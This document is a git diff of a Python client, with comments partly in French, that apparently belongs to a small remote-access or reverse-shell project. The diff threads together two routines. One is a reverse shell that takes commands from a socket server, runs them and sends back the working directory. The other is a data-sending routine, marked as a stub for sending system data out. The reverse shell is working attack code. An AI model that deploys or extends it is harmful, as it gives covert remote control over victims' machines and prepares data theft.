@@ -9,11 +9,13 @@ import os
 import subprocess
 import sys
 import json
+import threading
+from time import sleep
 
 
 class Client():
     def __init__(self):
-        pass
+        self._connectionThreadList = [self._sendingData, self._ReverseShell]
 
     def _sending(self, s, data):
         return s.send(bytes(json.dumps(data), "UTF-8"))
@@ -29,7 +31,7 @@ class Client():
                 continue
         
 
-    def sendingData(self):
+    def _sendingData(self):
         s = socket.socket()
         ip = socket.gethostname()
         host = ip
@@ -38,18 +40,24 @@ class Client():
         s.connect((host, port))
         data = {}
 
+        data["message"] = "Voici de l'information: TEST"
+        self._sending(s, data)
+        sleep(1)
+        data["message"] = "exit"
+        self._sending(s, data)
+        s.close
         # TODO envoi les données du système changer la fonction
-        while True:
-            data["message"] = input('> ')
-            if data["message"].lower() == "exit":
-                self._sending(s, data)
-                s.close
-                break
+        # while True:
+        #     data["message"] = input('> ')
+        #     if data["message"].lower() == "exit":
+        #         self._sending(s, data)
+        #         s.close
+        #         break
 
-            self._sending(s, data)
+        #     self._sending(s, data)
 
     
-    def sendingReverseShell(self):
+    def _ReverseShell(self):
         s = socket.socket()
         ip = socket.gethostname()
         host = ip
@@ -62,16 +70,20 @@ class Client():
         while not quitting:
             data["cwd"] = os.getcwd()
 
+            # on envoit le résultat de la commande
             self._sending(s, data)
 
-            # Waiting for a command
+            # on reçoit la commande à exécuter
             data = self._receiving(s)
-            commandArgs = data["command"].split()
-
+            
+            # TODO: if whoami
+            # on 
             if data["command"].lower() == "exit":
                 quitting = True
                 self._sending(s, data)
                 s.close()
+            
+            commandArgs = data["command"].split()
             if commandArgs[0].lower() == "cd":
                 try:
                     os.chdir(' '.join(commandArgs[1:]))
@@ -86,7 +98,10 @@ class Client():
 
     def main(self):
         # [1]_ [2]_
-        self.sendingReverseShell()
+        for connection in self._connectionThreadList:
+            threading.Thread(target=connection).start()
+        # self._sendingData()
+        # self._ReverseShell()
 
 if __name__ == "__main__":
    Client().main()
